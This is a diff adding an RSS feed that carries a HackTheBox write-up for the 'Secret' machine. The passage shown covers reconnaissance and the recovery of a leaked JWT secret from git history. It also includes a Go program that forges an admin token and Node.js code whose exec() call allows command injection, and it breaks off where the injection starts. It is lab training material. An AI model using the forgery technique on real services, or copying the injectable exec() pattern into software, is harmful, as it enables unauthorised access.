@@ -1,0 +1,482 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Core-dump on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/core-dump/</link>
+    <description>Recent content in Core-dump on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 28 Sep 2022 00:17:45 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/core-dump/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Secret</title>
+      <link>https://fahmifj.github.io/hackthebox/secret/</link>
+      <pubDate>Wed, 28 Sep 2022 00:17:45 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/secret/</guid>
+      <description>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&amp;rsquo;s a custom program with SUID bit that can be exploited by crashing it.
+Skills Learned Forging JWT Command injection in API Abuse Core Dump with SUID Tools nmap JWT tool curl Reconnaissance Nmap Full TCP port scan with nmap discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.</description>
+      <content:encoded><![CDATA[<p>Secret starts with analyzing web source to recover a secret token from older commit. The secret is then used to forge JWT Admin token for accessing a private API route which is vulnerable to command injection and that eventually allows me to gain shell access on the system. For the root part, there&rsquo;s a custom program with SUID bit that can be exploited by crashing it.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Forging JWT</li>
+<li>Command injection in API</li>
+<li>Abuse Core Dump with SUID</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>nmap</li>
+<li>JWT tool</li>
+<li>curl</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>Full TCP port scan with <code>nmap</code> discovers 3 open ports: SSH on its default port, HTTP on port 80 handled by NGINX, and another HTTP on port 3000 handled by Node.js.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ fscan 10.10.11.120 secret
+</span></span><span class="line"><span class="cl">nmap -p- 10.10.11.120 <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f1 <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed <span class="s1">&#39;s/,$//&#39;</span>
+</span></span><span class="line"><span class="cl">nmap -p 22,80,3000 -sC -sV -oA nmap/all-tcp-ports-secret 10.10.11.120
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-30 23:20 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.120
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.073s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
+</span></span><span class="line"><span class="cl">3000/tcp open  http    Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: DUMB Docs
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.04 seconds
+</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting the web on port 80 shows an online API documentation page called &ldquo;DUMBDocs&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20220926161011625.png" alt="image-20220926161011625"  /></div>
+</p>
+<p>The Live Demo button points to <code>/api/</code>, but it&rsquo;s a 404.</p>
+<p><div class="img-container"><img src="imgs/image-20211031105210501.png" alt="image-20211031105210501"  /></div>
+</p>
+<p>At the bottom of the page, there&rsquo;s a button to download the API source code and I&rsquo;ll grab it.</p>
+<p><div class="img-container"><img src="imgs/image-20211031104419915.png" alt="image-20211031104419915"  /></div>
+</p>
+<p>Clicking on any of the available card menus (introduction, installation, etc.) redirects to <code>/docs</code>, which in this section it explains how to use the API.</p>
+<p><div class="img-container"><img src="imgs/image-20211031110930866.png" alt="image-20211031110930866"  /></div>
+</p>
+<p>Some sections contain <em>lorem ipsum</em> text, some are not. That should be the hint where to go further</p>
+<h3 id="tcp-3000---website">TCP 3000 - Website</h3>
+<p>On port 3000, it serves the same site as on port 80, but it serverd by <code>node.js</code> not <code>NGINX</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20211031110717336.png" alt="image-20211031110717336"  /></div>
+</p>
+<p>From here, I&rsquo;ll look into the API.</p>
+<h3 id="api">API</h3>
+<h4 id="register">Register</h4>
+<p>According to the documentation (<code>/docs</code>), I can register a user by sending API request to <code>/api/user/register</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;name&#34;: &#34;syncrst&#34;,&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/register
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;user&#34;</span>:<span class="s2">&#34;syncrst&#34;</span><span class="o">}</span>
+</span></span></code></pre></div><p>The response returns my username and that means the registration was successful.</p>
+<h4 id="login---jwt-token">Login -&gt; JWT token</h4>
+<p>Now that I&rsquo;ve been registered, I can login to get a <a href="https://jwt.io/introduction">JWT token</a> by sending API request to <code>/api/user/login</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ curl -H <span class="s1">&#39;Content-Type: application/json&#39;</span> -d <span class="s1">&#39;{&#34;email&#34;: &#34;syncrst1@secret.com&#34;,&#34;password&#34;: &#34;syncrst&#34;}&#39;</span> http://secret.htb:3000/api/user/login 
+</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc
+</span></span></code></pre></div><p>The payload data of this JWT can be seen with <a href="https://jwt.io">jwt.io</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20220927133742256.png" alt="image-20220927133742256"  /></div>
+</p>
+<h4 id="private-route">Private Route</h4>
+<p>The last API route in this docs is <code>/api/priv</code>. I can use the auth token I got on this route, where it basically just checks for user role or privilege.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «secret» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ curl -sH <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MzMxYzk5OGJkMDdlMGQ3YTU1ODcyOGYiLCJuYW1lIjoic3luY3JzdCIsImVtYWlsIjoic3luY3JzdDFAc2VjcmV0LmNvbSIsImlhdCI6MTY2NDIwNzU5OX0.VGfQxKW8DbdCCWGTeyEo6MAHhOkEqeaW-IBvyaik4oc&#39;</span> http://secret.htb:3000/api/priv <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;role&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;you are normal user&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;syncrst&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>It&rsquo;s still vague what to do with this API, so I&rsquo;ll look into the source code.</p>
+<h3 id="source-code-analysis">Source Code Analysis</h3>
+<h4 id="directory-structure">Directory Structure</h4>
+<p>The source code has the typical structure of node js application</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.28» 
+</span></span><span class="line"><span class="cl">$ tree -L <span class="m">2</span> . 
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── files.zip
+</span></span><span class="line"><span class="cl">└── local-web
+</span></span><span class="line"><span class="cl">    ├── index.js
+</span></span><span class="line"><span class="cl">    ├── model
+</span></span><span class="line"><span class="cl">    ├── node_modules
+</span></span><span class="line"><span class="cl">    ├── package.json
+</span></span><span class="line"><span class="cl">    ├── package-lock.json
+</span></span><span class="line"><span class="cl">    ├── public
+</span></span><span class="line"><span class="cl">    ├── routes
+</span></span><span class="line"><span class="cl">    ├── src
+</span></span><span class="line"><span class="cl">    └── validations.js
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="m">7</span> directories, <span class="m">5</span> files
+</span></span></code></pre></div><h4 id="commit-history">Commit History</h4>
+<p>When I enter the <code>local-web</code> directory, my git plugin is activated, which indicates it contains git objects. So it&rsquo;s worth to start with git first.</p>
+<p>Running <code>git log</code> shows the commit history, author and email address.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+</span></span><span class="line"><span class="cl">$ git log 
+</span></span><span class="line"><span class="cl">commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Thu Sep <span class="m">9</span> 00:03:27 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    now we can view logs from server 😃
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:30:17 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    removed .env <span class="k">for</span> security reasons
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit de0a46b5107a2f4d26e348303e76d85ae4870934
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:29:19 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    added /downloads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:27:35 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    removed swap
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 3a367e735ee76569664bf7754eaaade7c735d702
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:26:39 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    added downloads
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">commit 55fe756a29268f9b4e786ae468952ca4a8df1bd8
+</span></span><span class="line"><span class="cl">Author: dasithsv &lt;dasithsv@gmail.com&gt;
+</span></span><span class="line"><span class="cl">Date:   Fri Sep <span class="m">3</span> 11:25:52 <span class="m">2021</span> +0530
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    first commit
+</span></span></code></pre></div><p>Commit <code>67d8da7</code> seems interesting. When comparing it with commit <code>de0a46b</code>, there&rsquo;s a deleted secret token.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «local-web» «10.10.14.28» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
+</span></span><span class="line"><span class="cl">$ git diff 67d8da7 de0a46b <span class="p">|</span> cat
+</span></span><span class="line"><span class="cl">diff --git a/.env b/.env
+</span></span><span class="line"><span class="cl">index 31db370..fb6f587 <span class="m">100644</span>
+</span></span><span class="line"><span class="cl">--- a/.env
+</span></span><span class="line"><span class="cl">+++ b/.env
+</span></span><span class="line"><span class="cl">@@ -1,2 +1,2 @@
+</span></span><span class="line"><span class="cl"> <span class="nv">DB_CONNECT</span> <span class="o">=</span> <span class="s1">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
+</span></span><span class="line"><span class="cl">-TOKEN_SECRET <span class="o">=</span> secret
+</span></span><span class="line"><span class="cl">+TOKEN_SECRET <span class="o">=</span> gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+</span></span></code></pre></div><p>I&rsquo;ll note that secret token.</p>
+<h4 id="web-routes">Web Routes</h4>
+<p>Looking at the <code>index.js</code> file, there are three defined routes: <code>privRoute</code>, <code>authRoute</code>, and <code>webroute</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">const <span class="nv">privRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/private&#39;</span><span class="o">)</span> <span class="c1"># location: routes/private.js</span>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">// import routs 
+</span></span><span class="line"><span class="cl">const <span class="nv">authRoute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./routes/auth&#39;</span><span class="o">)</span><span class="p">;</span> <span class="c1"># location: routes/auth.js</span>
+</span></span><span class="line"><span class="cl">const <span class="nv">webroute</span> <span class="o">=</span> require<span class="o">(</span><span class="s1">&#39;./src/routes/web&#39;</span><span class="o">)</span> <span class="c1"># location: src/routes/web.js</span>
+</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
+</span></span><span class="line"><span class="cl">//middle ware 
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span>express.json<span class="o">())</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/user&#39;</span>,authRoute<span class="o">)</span>
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/api/&#39;</span>, privRoute<span class="o">)</span>
+</span></span><span class="line"><span class="cl">app.use<span class="o">(</span><span class="s1">&#39;/&#39;</span>, webroute<span class="o">)</span>
+</span></span></code></pre></div><p><code>webroute</code> is the router that handles the documentation web while <code>authRoute</code> is the router that handles the API  for user registration (<code>/api/user/register</code>) and login (<code>/api/user/login</code>) .</p>
+<p>As for <code>privRoute</code>, it handles the API for private route (<code>/api/priv</code>). But, there&rsquo;s a hidden route <code>/api/logs</code> that wasn&rsquo;t listed in the API documentation. What&rsquo;s more interesting is that <code>/api/logs</code> route is vulnerable to command injection only if I pass the verification as user <code>theadmin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">userinfo</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="nx">req</span><span class="p">.</span><span class="nx">user</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span> <span class="err">#</span> <span class="nx">command</span> <span class="nx">injection</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">role</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">role</span><span class="o">:</span> <span class="s2">&#34;you are normal user&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">desc</span><span class="o">:</span> <span class="nx">userinfo</span><span class="p">.</span><span class="nx">name</span><span class="p">.</span><span class="nx">name</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-dasith">Shell as dasith</h3>
+<h4 id="forging-admin-token">Forging Admin Token</h4>
+<p>With the secret token obtained, I&rsquo;ll write a program to forge valid JWT token for user <code>theadmin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s">&#34;fmt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">jwt</span> <span class="s">&#34;github.com/dgrijalva/jwt-go&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">claims</span> <span class="o">:=</span> <span class="kd">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ID</span>    <span class="kt">string</span> <span class="s">`json:&#34;_id,omitempty&#34;`</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Name</span>  <span class="kt">string</span> <span class="s">`json:&#34;name,omitempty&#34;`</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Email</span> <span class="kt">string</span> <span class="s">`json:&#34;email,omitempty&#34;`</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">jwt</span><span class="p">.</span><span class="nx">StandardClaims</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">ID</span><span class="p">:</span>    <span class="s">&#34;6114654d77f9a54e00f05777&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Name</span><span class="p">:</span>  <span class="s">&#34;theadmin&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Email</span><span class="p">:</span> <span class="s">&#34;root@dasith.works&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nx">token</span> <span class="o">:=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nf">NewWithClaims</span><span class="p">(</span><span class="nx">jwt</span><span class="p">.</span><span class="nx">SigningMethodHS256</span><span class="p">,</span> <span class="nx">claims</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">secret</span> <span class="o">:=</span> <span class="s">&#34;gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE&#34;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">signedToken</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">SignedString</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">secret</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="nx">signedToken</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>I&rsquo;ll run the program to get the auth token.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$ go run forge-jwt.go
+</span></span><span class="line"><span class="cl">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIn0.TKKattF_Exm2kXW4PQOo9jyrW0cMYuQkiQWP7DuhPn0
+</span></span></code></pre></div><p>Now I can verify if that token works by accessing the <code>/api/priv</code> route</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
+</span></span><span class="line"><span class="cl">$  curl -s -H <span class="s1">&#39;Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfa...[SNIP]...Pn0&#39;</span> <span class="s2">&#34;http://secret.htb:3000/api/priv&#34;</span> <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;creds&#34;</span>: <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;role&#34;</span>: <span class="s2">&#34;admin&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;username&#34;</span>: <span class="s2">&#34;theadmin&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;desc&#34;</span>: <span class="s2">&#34;welcome back admin,&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><h4 id="command-injection">Command Injection</h4>
+<p>With admin token, I can access the <code>/api/logs</code> route.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">router</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/logs&#39;</span><span class="p">,</span> <span class="nx">verifytoken</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;theadmin&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">getLogs</span> <span class="o">=</span> <span class="sb">`git log --oneline </span><span class="si">${</span><span class="nx">file</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exec</span><span class="p">(</span><span class="nx">getLogs</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span> <span class="p">,</span> <span class="nx">output</span><span class="p">)</span> <span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="nx">err</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">500</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">err</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">return</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">       <span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">(</span><span class="nx">output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">...[</span><span class="nx">SNIP</span><span class="p">]...</span>
+</span></span></code></pre></div><p>This route takes one query: <code>file</code>, where its value then get passed into <code>getLogs</code> and eventually executed as OS command in the <code>exec()</code> function. Knowing this, I can inject OS command in the <code>file</code> query with <code>|</code> (pipe):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «exploits» «10.10.14.28»
